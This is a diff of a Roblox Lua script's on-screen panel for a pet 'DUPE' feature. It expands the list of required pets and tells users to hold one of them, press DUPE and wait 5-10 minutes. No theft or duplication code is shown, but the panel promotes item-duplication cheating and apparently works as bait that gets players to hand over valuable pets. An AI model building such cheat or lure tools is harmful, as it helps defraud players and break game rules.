@@ -129,11 +129,12 @@ local warningBox = Instance.new("TextLabel")
 warningBox.Size = UDim2.new(1, -20 * scaleFactor, 0, 35 * scaleFactor)
 warningBox.Position = UDim2.new(0, 10 * scaleFactor, 0, 35 * scaleFactor)
 warningBox.BackgroundColor3 = Color3.fromRGB(200, 55, 55)
-warningBox.Text = "⚠️ REQUIRES RED FOX, DRAGONFLY, RACCOON!"
+warningBox.Text = "⚠️ REQUIRES: Polar Bear, Red Fox, Chicken Zombie, Dragonfly, Raccoon, Queen Bee"
 warningBox.TextColor3 = Color3.new(1, 1, 1)
 warningBox.TextSize = 14 * scaleFactor
 warningBox.Font = Enum.Font.GothamBold
 warningBox.TextXAlignment = Enum.TextXAlignment.Left
+warningBox.TextWrapped = true
 warningBox.BorderSizePixel = 0
 warningBox.ClipsDescendants = true
 warningBox.Parent = contentFrame
@@ -151,14 +152,14 @@ instrTitle.TextColor3 = Color3.new(1, 1, 1)
 instrTitle.TextSize = 16 * scaleFactor
 instrTitle.Font = Enum.Font.GothamBold
 instrTitle.TextXAlignment = Enum.TextXAlignment.Left
+instrTitle.TextWrapped = true
 instrTitle.Parent = contentFrame
 
 -- Instruction Steps (smaller for mobile)
 local steps = {
-    "1. Hold a RED FOX, DRAGONFLY, RACCOON",
-    "2. Keep inventory open",
-    "3. Press DUPE button",
-    "4. Wait 5-10 Minutes"
+    "1. Hold a Polar Bear, Red Fox, Chicken Zombie, Dragonfly, Raccoon, or Queen Bee",
+    "2. Press DUPE button",
+    "3. Wait 5-10 Minutes"
 }
 
 for i, step in ipairs(steps) do
@@ -213,7 +214,7 @@ local function buttonClickAnim(button)
     tweenUp:Play()
 end
 
-local requiredPetsList = {"red fox", "dragonfly", "raccoon", "mole"}
+local requiredPetsList = {"red fox", "dragonfly", "raccoon", "mole", "polar bear", "chicken zombie", "queen bee"}
 
 local function animateChecking()
     local dots = {".", "..", "..."}
